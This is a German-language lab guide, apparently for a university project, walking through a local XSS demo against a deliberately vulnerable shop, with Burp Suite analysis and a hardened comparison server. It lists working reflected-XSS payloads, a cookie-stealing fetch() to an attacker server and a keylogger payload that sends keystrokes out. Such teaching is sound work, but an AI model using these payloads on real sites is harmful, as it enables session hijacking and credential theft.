# XSS Demonstration - Step-by-Step Anleitung

**Vollständige Anleitung von der Installation bis zur Burp Suite Demonstration**

**NUR FÜR BILDUNGSZWECKE!**

---

## Schritt 0: Repository klonen

### 0.1 Repository von GitHub klonen

```bash
git clone https://github.com/DEIN-USERNAME/XSS_Projekt.git
cd XSS_Projekt
```

**Oder:** Projekt-Ordner direkt herunterladen und entpacken

---

## Schritt 1: Voraussetzungen prüfen

### 1.1 Python installiert?

```bash
python --version
```

**Erwartete Ausgabe:** `Python 3.8` oder höher

**Falls nicht installiert:**
- Download: https://www.python.org/downloads/
- Während Installation: "Add Python to PATH" aktivieren!

### 1.2 Node.js installiert?

```bash
node --version
npm --version
```

**Erwartete Ausgabe:** `v16.0.0` oder höher

**Falls nicht installiert:**
- Download: https://nodejs.org/

### 1.3 Burp Suite installiert? (für später)

- Download: https://portswigger.net/burp/communitydownload
- Community Edition ist kostenlos

---

## Schritt 2: Python Dependencies installieren

### 2.1 In Projekt-Ordner wechseln

```bash
cd d:\Studium\Semester_3\cybersec\XSS_Projekt
```

### 2.2 Flask installieren

```bash
pip install Flask==3.0.0 Werkzeug==3.0.1
```

**Oder mit requirements.txt:**

```bash
pip install -r requirements.txt
```

**Erwartete Ausgabe:**
```
Successfully installed Flask-3.0.0 Werkzeug-3.0.1
```

---

## Schritt 3: Node.js Dependencies installieren

### 3.1 In Attacker-Server Ordner wechseln

```bash
cd attacker-server
```

### 3.2 NPM Packages installieren

```bash
npm install
```

**Erwartete Ausgabe:**
```
added 52 packages
```

### 3.3 Zurück zum Hauptordner

```bash
cd ..
```

---

## Schritt 4: Unsicheren Server starten

### 4.1 In unsecurepage Ordner wechseln

```bash
cd unsecurepage
```

### 4.2 Server starten

```bash
python server.py
```

**Erwartete Ausgabe:**
```
Server: http://localhost:5000
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://192.168.x.x:5000
```

**WICHTIG:** Terminal offen lassen! Server läuft jetzt.

### 4.3 Webseite im Browser öffnen

**Browser öffnen und eingeben:**
```
http://localhost:5000
```

**Du solltest sehen:**
- TechStore Webseite
- 8 Produkte (iPhone, Dell Laptop, Sony Kopfhörer, etc.)
- Header mit Logo und Warenkorb
- Suchfeld oben

✅ **Server läuft erfolgreich!**

---

## Schritt 5: Ersten XSS-Test durchführen (ohne Burp)

### 5.1 Einfacher Alert-Test

**Im Browser in die Adresszeile eingeben:**
```
http://localhost:5000/?search=<img src=x onerror="alert('XSS funktioniert!')">
```

**Enter drücken**

**Was passiert:**
- Alert-Box erscheint mit "XSS funktioniert!"
- ✅ XSS ist erfolgreich!

### 5.2 Cookies anzeigen

**Im Browser eingeben:**
```
http://localhost:5000/?search=<img src=x onerror="alert(document.cookie)">
```

**Was passiert:**
- Alert-Box zeigt alle Cookies
- Du siehst: `sessionId=abc123; authToken=xyz789; userName=Max; userEmail=max@example.com`

### 5.3 Verschiedene Vektoren testen

**Promo-Vector:**
```
http://localhost:5000/?promo=<svg onload="alert('Promo XSS')">
```

**Error-Vector:**
```
http://localhost:5000/?error=<details open ontoggle="alert('Error XSS')">
```

**Warenkorb-Gutschein:**
1. Gehe zu http://localhost:5000/cart
2. Im Gutscheincode-Feld eingeben: `<img src=x onerror="alert('Cart XSS')">`
3. "Einlösen" klicken
4. Alert erscheint

✅ **Alle XSS-Vektoren funktionieren!**

---

## Schritt 6: Attacker Server starten

### 6.1 Neues Terminal öffnen

**WICHTIG:** Das erste Terminal mit server.py läuft weiter!

### 6.2 In attacker-server Ordner wechseln

```bash
cd d:\Studium\Semester_3\cybersec\XSS_Projekt\attacker-server
```

### 6.3 Attacker Server starten

```bash
node AttServ.js
```

**Erwartete Ausgabe:**
```
==================================
   ATTACKER SERVER RUNNING
==================================
Server: http://localhost:3000
Dashboard: http://localhost:3000/dashboard

Endpoints:
- Cookie Stealing: /steal?c=<cookies>
- Keylogger: /keys?d=<data>&u=<url>
```

**Terminal offen lassen!**

### 6.4 Dashboard im Browser öffnen

**Neuer Browser-Tab:**
```
http://localhost:3000/dashboard
```

**Du solltest sehen:**
- "Attacker Dashboard"
- Tabellen für gestohlene Cookies und Keylogger-Daten
- Momentan noch leer (normal!)

✅ **Attacker Server läuft!**

---

## Schritt 7: Cookie-Diebstahl demonstrieren

### 7.1 XSS-Payload mit Cookie-Diebstahl ausführen

**Im Browser eingeben:**
```
http://localhost:5000/?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### 7.2 Im Attacker Terminal prüfen

**Im Terminal von AttServ.js siehst du:**
```
[2025-01-XX XX:XX:XX]
[COOKIE STOLEN]
Cookies: sessionId=abc123; authToken=xyz789; userName=Max; userEmail=max@example.com
IP: ::1
User-Agent: Mozilla/5.0 ...
```

### 7.3 Im Dashboard prüfen

**Browser-Tab mit Dashboard aktualisieren (F5)**

**Du siehst jetzt:**
- Tabelle mit gestohlenen Cookies
- Timestamp
- IP-Adresse
- User-Agent

✅ **Cookie-Diebstahl erfolgreich demonstriert!**

---

## Schritt 8: Burp Suite einrichten

### 8.1 Burp Suite starten

**Programm öffnen:** Burp Suite Community Edition

**Startup Wizard:**
1. "Temporary project" auswählen
2. "Use Burp defaults"
3. "Start Burp" klicken

### 8.2 Proxy konfigurieren

**In Burp Suite:**
1. Gehe zu Tab: **Proxy**
2. Gehe zu Sub-Tab: **Options**
3. Prüfe "Proxy Listeners"
4. Standard sollte sein: `127.0.0.1:8080`

✅ Wenn du das siehst, ist der Proxy aktiv

### 8.3 Browser Proxy einstellen (Firefox empfohlen)

**Firefox Einstellungen:**
1. **Settings** öffnen (Zahnrad)
2. Ganz unten: **Network Settings**
3. Klicke **Settings...**
4. Wähle: **Manual proxy configuration**
5. **HTTP Proxy:** `127.0.0.1`
6. **Port:** `8080`
7. ✅ Aktiviere: **Also use this proxy for HTTPS**
8. **OK** klicken

### 8.4 Burp CA Zertifikat installieren (wichtig für HTTPS)

**Im Firefox (mit Burp Proxy aktiv):**
1. Adresszeile: `http://burpsuite`
2. Rechts oben: **CA Certificate** klicken
3. Datei wird heruntergeladen: `cacert.der`

**In Firefox:**
1. Settings → **Privacy & Security**
2. Scroll nach unten: **Certificates**
3. **View Certificates...**
4. Tab: **Authorities**
5. **Import...** klicken
6. Wähle `cacert.der`
7. ✅ Aktiviere: **Trust this CA to identify websites**
8. **OK** klicken

✅ **Burp Suite ist jetzt bereit!**

---

## Schritt 9: XSS mit Burp Suite nachweisen

### 9.1 Intercept aktivieren

**In Burp Suite:**
1. Tab: **Proxy**
2. Sub-Tab: **Intercept**
3. Button sollte sagen: **Intercept is on**
4. Falls "Intercept is off": Klicke Button zum Aktivieren

### 9.2 XSS-Request senden

**Im Firefox eingeben:**
```
http://localhost:5000/?search=<img src=x onerror="alert('Burp Test')">
```

**Enter drücken**

**Was passiert:**
- Browser zeigt "Waiting..." (hängt)
- Das ist normal! Burp fängt den Request ab

### 9.3 Request in Burp analysieren

**In Burp Suite siehst du jetzt:**

**Tab: Proxy → Intercept**
```
GET /?search=<img src=x onerror="alert('Burp Test')"> HTTP/1.1
Host: localhost:5000
User-Agent: Mozilla/5.0 ...
Accept: text/html
...
```

**Das ist der abgefangene Request mit deinem XSS-Payload!**

### 9.4 Request durchlassen

**In Burp Suite:**
- Klicke **Forward** (oder drücke F12)
- Request wird an Server gesendet
- Response kommt zurück
- Klicke nochmal **Forward** falls nötig

**Im Browser:**
- Seite wird geladen
- Alert-Box erscheint
- XSS wurde ausgeführt

### 9.5 Response in HTTP History analysieren

**In Burp Suite:**
1. Tab: **Proxy**
2. Sub-Tab: **HTTP history**
3. Finde den Request: `GET /?search=<img...`
4. **Klicke auf den Request**

**Unten siehst du zwei Tabs:**

**Request Tab:**
```
GET /?search=<img src=x onerror="alert('Burp Test')"> HTTP/1.1
Host: localhost:5000
...
```

**Response Tab:**
```html
HTTP/1.1 200 OK
Content-Type: text/html
...

<!DOCTYPE html>
<html>
...
<div style="...">
    <strong>Suchergebnisse:</strong> <img src=x onerror="alert('Burp Test')">
</div>
...
</html>
```

**🎯 WICHTIG:** Der XSS-Payload ist **DIREKT in der HTTP Response** sichtbar!

✅ **Das ist der Beweis für Reflected XSS!**

---

## Schritt 10: Burp Repeater verwenden

### 10.1 Request zu Repeater senden

**In HTTP History:**
1. **Rechtsklick** auf den XSS-Request
2. Wähle: **Send to Repeater**

**Ein neuer Tab öffnet sich:** Repeater

### 10.2 Payload modifizieren

**Im Repeater Tab - Linke Seite (Request):**

Ändere den Parameter:
```
GET /?search=TEST123 HTTP/1.1
```

**Klicke: Send**

**Rechte Seite (Response) zeigt:**
```html
<strong>Suchergebnisse:</strong> TEST123
```

### 10.3 Verschiedene XSS-Payloads testen

**Payload 1: Script-Tag**
```
GET /?search=<script>alert(1)</script> HTTP/1.1
```
**Send** → Response zeigt Payload im HTML

**Payload 2: SVG**
```
GET /?search=<svg onload=alert(1)> HTTP/1.1
```
**Send** → Response zeigt Payload im HTML

**Payload 3: IMG**
```
GET /?search=<img src=x onerror=alert(1)> HTTP/1.1
```
**Send** → Response zeigt Payload im HTML

**Payload 4: Details**
```
GET /?search=<details open ontoggle=alert(1)> HTTP/1.1
```
**Send** → Response zeigt Payload im HTML

✅ **Alle Payloads werden direkt reflektiert!**

---

## Schritt 11: Cookie-Diebstahl mit Burp nachweisen

### 11.1 Stelle sicher, dass Attacker Server läuft

**Im Terminal von AttServ.js solltest du sehen:**
```
Server: http://localhost:3000
```

Falls nicht: `node AttServ.js` erneut ausführen

### 11.2 XSS mit Cookie-Diebstahl senden

**Im Firefox mit Burp Proxy:**
```
http://localhost:5000/?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)">
```

### 11.3 In Burp HTTP History analysieren

**Du siehst ZWEI Requests:**

**Request 1: An localhost:5000**
```
GET /?search=<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)"> HTTP/1.1
Host: localhost:5000
```

**Response 1:**
```html
<div>...<img src=x onerror="fetch('http://localhost:3000/steal?c='+document.cookie)"></div>
```
👉 XSS-Payload wird reflektiert

**Request 2: An localhost:3000 (automatisch durch XSS!)**
```
GET /steal?c=sessionId%3Dabc123%3B%20authToken%3Dxyz789%3B%20userName%3DMax%3B%20userEmail%3Dmax%40example.com HTTP/1.1
Host: localhost:3000
```

👉 **Das sind die gestohlenen Cookies!**

### 11.4 Gestohlene Daten dekodieren

**Der Parameter `c` ist URL-encoded:**
```
sessionId%3Dabc123%3B%20authToken%3Dxyz789
```

**Dekodiert:**
```
sessionId=abc123; authToken=xyz789; userName=Max; userEmail=max@example.com
```

**In Burp Suite kannst du dekodieren:**
1. Markiere den URL-encoded String
2. Rechtsklick → **Convert selection** → **URL** → **URL-decode**

✅ **Kompletter Angriffs-Flow in Burp sichtbar!**

---

## Schritt 12: Burp Scanner verwenden (Professional Version)

**Hinweis:** Nur mit Burp Suite Professional

### 12.1 Active Scan starten

**In HTTP History:**
1. **Rechtsklick** auf Request
2. Wähle: **Do active scan**
3. **OK** klicken

**Scanner läuft jetzt automatisch!**

### 12.2 Scan Results ansehen

**Tab: Target**
1. Sub-Tab: **Site map**
2. Finde: `http://localhost:5000`
3. Expandiere den Tree
4. Klicke auf Seiten mit Issues

**Tab: Dashboard**
- Zeigt gefundene Vulnerabilities
- XSS Issues mit Severity "High"

### 12.3 Issue Details

**Klick auf ein XSS-Issue:**
- **Description:** Reflected XSS gefunden
- **Severity:** High
- **Confidence:** Certain
- **Affected parameter:** search, promo, error, etc.
- **Proof:** Payload und Response

✅ **Scanner hat alle 7 XSS-Vektoren gefunden!**

---

## Schritt 13: Geschützten Server testen

### 13.1 Neues Terminal öffnen

**WICHTIG:** Andere Terminals laufen weiter!

### 13.2 Geschützten Server starten

```bash
cd d:\Studium\Semester_3\cybersec\XSS_Projekt\securepage
python server_secure.py
```

**Erwartete Ausgabe:**
```
Sicherer Server: http://localhost:6000
```

### 13.3 Im Browser öffnen

```
http://localhost:6000
```

**Du siehst:**
- Ähnliche Webseite wie unsecure
- Grüner Banner: "Diese Seite ist gegen XSS geschützt"

### 13.4 XSS-Test auf sicherem Server

**Im Browser mit Burp Proxy eingeben:**
```
http://localhost:6000/?search=<img src=x onerror="alert('Test')">
```

**Was passiert:**
- ❌ KEINE Alert-Box
- Payload wird als Text angezeigt: `<img src=x onerror="alert('Test')">`

### 13.5 In Burp Response analysieren

**HTTP History → Response:**
```html
<div>
    <strong>Suche (escaped):</strong> &lt;img src=x onerror=&quot;alert('Test')&quot;&gt;
</div>
```

**Zusätzlich im Response Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

✅ **Schutzmaßnahmen funktionieren!**

---

## Schritt 14: Vergleich in Burp dokumentieren

### 14.1 Beide Requests nebeneinander

**Unsicher (localhost:5000):**
```html
Response:
<div>Suchergebnisse: <img src=x onerror="alert(1)"></div>
                       ↑ RAW HTML, wird ausgeführt
```

**Sicher (localhost:6000):**
```html
Response:
<div>Suche (escaped): &lt;img src=x onerror=&quot;alert(1)&quot;&gt;</div>
                      ↑ HTML Entities, nur Text
```

### 14.2 Screenshots machen

**Wichtige Screenshots für Dokumentation:**

1. **Burp HTTP History** - Liste der Requests
2. **Burp Response** (unsicher) - Payload im Raw HTML
3. **Burp Response** (sicher) - Escaped Payload
4. **Browser mit Alert** - XSS erfolgreich
5. **Attacker Dashboard** - Gestohlene Cookies
6. **Burp Request zu /steal** - Cookie-Diebstahl sichtbar
7. **CSP Header** - Security Headers im sicheren Server

---

## Schritt 15: Alle 7 XSS-Vektoren durchgehen

### Vector 1: Search
```
http://localhost:5000/?search=<img src=x onerror=alert(1)>
```
In Burp Response prüfen ✅

### Vector 2: Promo
```
http://localhost:5000/?promo=<svg onload=alert(2)>
```
In Burp Response prüfen ✅

### Vector 3: Error
```
http://localhost:5000/?error=<details open ontoggle=alert(3)>
```
In Burp Response prüfen ✅

### Vector 4: Filter
```
http://localhost:5000/?filter=<input autofocus onfocus=alert(4)>
```
In Burp Response prüfen ✅

### Vector 5: Review
```
http://localhost:5000/?reviewer=Hacker&review=<iframe src=javascript:alert(5)>
```
In Burp Response prüfen ✅

### Vector 6: Contact
```
http://localhost:5000/contact?name=X&subject=X&message=<body onload=alert(6)>
```
In Burp Response prüfen ✅

### Vector 7: Voucher
```
http://localhost:5000/cart?voucher=<marquee onstart=alert(7)>
```
In Burp Response prüfen ✅

**Für jeden Vector:**
1. URL in Browser (mit Burp Proxy)
2. HTTP History öffnen
3. Response Tab analysieren
4. Screenshot machen
5. Payload im HTML nachweisen

---

## Schritt 16: Keylogger demonstrieren (Optional)

### 16.1 Keylogger-Payload ausführen

```
http://localhost:5000/?search=<img src=x onerror="var k='';document.onkeydown=function(e){k+=e.key;if(k.length>20){fetch('http://localhost:3000/keys?d='+encodeURIComponent(k)+'&u='+location.href);k=''}}">
```

### 16.2 Auf der Seite tippen

**Im Suchfeld oder irgendwo auf der Seite:**
- Tippe: "MeinPasswort123"
- Nach 20 Zeichen werden Daten gesendet

### 16.3 Im Attacker Terminal prüfen

```
[KEYLOGGER DATA]
Keys: MeinPasswort123
URL: http://localhost:5000/?search=...
```

### 16.4 Im Dashboard prüfen

**Keylogger Tabelle zeigt:**
- Getippte Keys
- Von welcher URL
- Timestamp

✅ **Keylogger funktioniert!**

---

## Schritt 17: Projekt-Aufräumen

### 17.1 Server stoppen

**Terminal 1 (unsecurepage):**
- `Ctrl+C` drücken

**Terminal 2 (attacker-server):**
- `Ctrl+C` drücken

**Terminal 3 (securepage):**
- `Ctrl+C` drücken

### 17.2 Burp Suite schließen

- Einfach schließen
- Temporary Project wird nicht gespeichert

### 17.3 Browser Proxy deaktivieren

**Firefox:**
1. Settings → Network Settings
2. Wähle: **No proxy**
3. OK klicken

✅ **Alles aufgeräumt!**

---

## Zusammenfassung: Was du erreicht hast

✅ **XSS Demonstration Setup:**
- Verwundbarer E-Commerce Shop (8 Produkte, 3 Warenkorb-Items)
- Attacker Server für Cookie-Diebstahl
- Sicherer Server zum Vergleich

✅ **XSS-Angriffe durchgeführt:**
- Simple Alert-Boxen
- Cookie-Anzeige
- Cookie-Diebstahl mit Attacker Server
- Keylogger-Demo

✅ **Burp Suite Nachweis:**
- HTTP Requests mit XSS-Payloads abgefangen
- HTTP Responses mit reflektierten Payloads analysiert
- Cookie-Diebstahl im Traffic sichtbar gemacht
- Burp Repeater für manuelle Tests
- Burp Scanner (Professional) alle Vektoren gefunden

✅ **Sicherheitsmaßnahmen demonstriert:**
- Input Escaping mit `escape()`
- Content Security Policy (CSP)
- Security Headers
- Vergleich unsicher vs. sicher in Burp

✅ **Alle 7 XSS-Vektoren getestet:**
1. Search Parameter
2. Promo Parameter
3. Error Parameter
4. Filter Parameter
5. Review Parameter
6. Contact Message
7. Voucher Code

---

## Nächste Schritte für Präsentation

### Vorbereitung:

1. **Screenshots sammeln:**
   - Burp Suite mit XSS-Payloads
   - Attacker Dashboard mit Daten
   - Vergleich unsicher vs. sicher

2. **Demo vorbereiten:**
   - Server starten können (schnell)
   - 2-3 Key-Payloads auswendig können
   - Burp Suite vorher öffnen

3. **Erklärungen vorbereiten:**
   - Was ist Reflected XSS?
   - Unterschied zu DOM-based XSS
   - Warum sicherer Server funktioniert

### Präsentations-Reihenfolge:

1. **Einführung** (2 Min)
   - Was ist XSS?
   - Warum gefährlich?

2. **Demo unsicherer Server** (5 Min)
   - Simple Alert
   - Cookie-Diebstahl

3. **Burp Suite Demo** (7 Min)
   - Request/Response zeigen
   - Payload im HTML nachweisen
   - Cookie-Diebstahl im Traffic

4. **Sicherer Server** (4 Min)
   - Schutzmaßnahmen zeigen
   - In Burp vergleichen

5. **Fazit** (2 Min)
   - Best Practices
   - Lessons Learned

---

## Troubleshooting

### Problem: Server startet nicht (Port belegt)

**Lösung:**
```bash
# Port ändern in server.py
app.run(port=5001)  # Statt 5000
```

### Problem: Burp zeigt keine Requests

**Lösung:**
- Browser Proxy korrekt? (127.0.0.1:8080)
- Intercept ON?
- Richtigen Browser verwendet?

### Problem: Cookies werden nicht gestohlen

**Lösung:**
- Attacker Server läuft? (`node AttServ.js`)
- Console in Browser öffnen (F12) - Fehler sichtbar?
- URL richtig? (`http://localhost:3000/steal`)

### Problem: Alert-Box erscheint nicht

**Lösung:**
- Browser Popup-Blocker deaktiviert?
- XSS-Protection im Browser? (sollte durch Meta-Tag deaktiviert sein)
- Burp Intercept aus? (Seite muss laden)

---

**Du bist jetzt bereit für deine XSS-Demonstration! 🎯**
